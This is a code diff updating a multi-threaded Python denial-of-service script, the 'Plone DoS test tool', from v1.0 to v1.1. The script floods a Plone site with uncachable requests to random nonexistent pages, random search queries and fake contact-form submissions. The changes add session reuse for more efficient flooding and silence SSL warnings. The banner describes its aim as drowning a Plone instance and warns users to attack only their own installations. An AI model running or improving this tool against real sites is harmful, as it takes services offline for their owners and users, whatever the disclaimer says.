@@ -18,9 +18,24 @@ import random
 import string
 import time
 
+# Disable the nasty warnings about SSL cert verification. This is a DoS tool!
+from requests.packages.urllib3.exceptions import InsecureRequestWarning
+requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
 
 sw_name = "Plone DoS test tool"
-sw_version = "v1.0"
+sw_version = "v1.1"
+sw_banner = '\nThis is the ' + sw_name + ' ' + sw_version + ' - Availability does matter.\n' \
+            'Use it to drown a Plone instance in non-cachable requests.\n' \
+            '(C) 2016 until today: 0_o -- null_null (nu11.nu11[at]yahoo.com)\n\n' \
+            'WARNING:    ATTACK YOUR OWN PLONE INSTALLATIONS ONLY!!!\n' \
+            '            WHEN USING THIS TOOL AGAINST OTHER INSTALLATIONS THAN THOSE\n' \
+            '            YOU ARE AUTHORIZED TO ATTACK, YOU MIGHT VIOLATE YOUR LOCAL LAWS!\n\n' \
+            'DISCLAIMER: This software is delivered as-is. Use it on your own risk!\n' \
+            '            I am _not_ responsible for any damage it might cause and\n' \
+            '            I cannot be held liable for it. YOU HAVE BEEN WARNED!\n\n' \
+            'License:    This software is licensed under GPLv3.\n' \
+            '            You find a copy of the license here:\n' \
+            '            http://www.gnu.org/licenses/gpl-3.0.en.html\n'
 threadLock = threading.Lock()
 threads = []
 running = True
@@ -44,18 +59,18 @@ class dos_nonexiting(threading.Thread):
         s = threading.local()
         # Use a backoff sleep time to avoid all threads starting at once
         time.sleep(random.random())
+        session = threading.local()
+        session = requests.Session()
         while self.__running:
             self.__randstr = ''.join(random.choice(string.ascii_uppercase + string.digits) for _ in range(8))
             self.__req = self.__victim + '/' + self.__randstr
             try:
-                self.__r = requests.get(self.__req, verify = False)
+                self.__r = session.get(self.__req, verify = False)
                 self.__e = self.__r.status_code
                 self.__h = self.__r.headers
                 self.__c = self.__r.content
-                if self.__e >= 500:
-                    s = "5"
-                else:
-                    s = "."
+                if self.__e >= 500: s = "5"
+                else: s = "."
                 # No need for thread safety here... Hrrhrrhrr :)
                 sys.stdout.write(s)
             except (requests.ConnectionError):
@@ -85,18 +100,18 @@ class dos_search(threading.Thread):
         s = threading.local()
         # Use a backoff sleep time to avoid all threads starting at once
         time.sleep(random.random())
+        session = threading.local()
+        session = requests.Session()
         while self.__running:
             self.__randstr = ''.join(random.choice(string.ascii_uppercase + string.digits) for _ in range(8))
             self.__req = self.__victim + '/@@search?SearchableText=' + self.__randstr
             try:
-                self.__r = requests.get(self.__req, verify = False)
+                self.__r = session.get(self.__req, verify = False)
                 self.__e = self.__r.status_code
                 self.__h = self.__r.headers
                 self.__c = self.__r.content
-                if self.__e >= 500:
-                    s = "5"
-                else:
-                    s = "."
+                if self.__e >= 500: s = "5"
+                else: s = "."
                 # No need for thread safety here... Hrrhrrhrr :)
                 sys.stdout.write(s)
             except (requests.ConnectionError):
@@ -131,6 +146,8 @@ class dos_contact(threading.Thread):
                           'Content-Type': 'multipart/form-data; boundary=---------------------------29713827018367436031035745563'}
         # Use a backoff sleep time to avoid all threads starting at once
         time.sleep(random.random())
+        session = threading.local()
+        session = requests.Session()
         while self.__running:
             self.__randstr = ''.join(random.choice(string.ascii_uppercase + string.digits) for _ in range(8))
             self.__data = '-----------------------------29713827018367436031035745563\x0d\x0a' \
@@ -145,14 +162,12 @@ class dos_contact(threading.Thread):
                           'Content-Disposition: form-data; name=\"form.buttons.send\"\x0d\x0a\x0d\x0aSenden\x0d\x0a' \
                           '-----------------------------29713827018367436031035745563--\x0d\x0a'
             try:
-                self.__r = requests.post(self.__req, headers=self.__headers, data=self.__data, verify = False)
+                self.__r = session.post(self.__req, headers=self.__headers, data=self.__data, verify = False)
                 self.__e = self.__r.status_code
                 self.__h = self.__r.headers
                 self.__c = self.__r.content
-                if self.__e >= 500:
-                    s = "5"
-                else:
-                    s = "."
+                if self.__e >= 500: s = "5"
+                else: s = "."
                 # No need for thread safety here... Hrrhrrhrr :)
                 sys.stdout.write(s)
             except (requests.ConnectionError):
@@ -173,8 +188,7 @@ def stop_all():
 def main():
     global threads
     global running
-    global sw_name
-    global sw_version
+    global sw_banner
     attacks = {0: dos_nonexiting,
                1: dos_search,
                2: dos_contact}
@@ -183,18 +197,6 @@ def main():
     signal.signal(signal.SIGTERM, stop_all)
     signal.signal(signal.SIGABRT, stop_all)
     random.seed()
-    sw_banner = '\nThis is the ' + sw_name + ' ' + sw_version + ' - Availability does matter.\n' \
-                'Use it to drown a Plone instance in non-cachable requests.\n' \
-                '(C) 2016 until today: 0_o -- null_null (nu11.nu11[at]yahoo.com)\n\n' \
-                'WARNING:    ATTACK YOUR OWN PLONE INSTALLATIONS ONLY!!!\n' \
-                '            WHEN USING THIS TOOL AGAINST OTHER INSTALLATIONS THAN THOSE\n' \
-                '            YOU ARE AUTHORIZED TO ATTACK, YOU MIGHT VIOLATE YOUR LOCAL LAWS!\n\n' \
-                'DISCLAIMER: This software is delivered as-is. Use it on your own risk!\n' \
-                '            I am _not_ responsible for any damage it might cause and\n' \
-                '            I cannot be held liable for it. YOU HAVE BEEN WARNED!\n\n' \
-                'License:    This software is licensed under GPLv3.\n' \
-                '            You find a copy of the license here:\n' \
-                '            http://www.gnu.org/licenses/gpl-3.0.en.html\n'
     print sw_banner
     argParser = argparse.ArgumentParser(formatter_class = argparse.ArgumentDefaultsHelpFormatter)
     argParser.epilog = "While the program is running, one character will be printed out for each request. E: connection error, 5: HTTP status 5xx, .: all other HTTP status codes."
@@ -245,4 +247,6 @@ if __name__ == '__main__':
     except (KeyboardInterrupt):
         print "\nBe p-a-t-i-e-n-t !!!"
         pass
-    
+   
+# vim syntax=python ts=4 sw=4 sts=4 sr noet
+ 
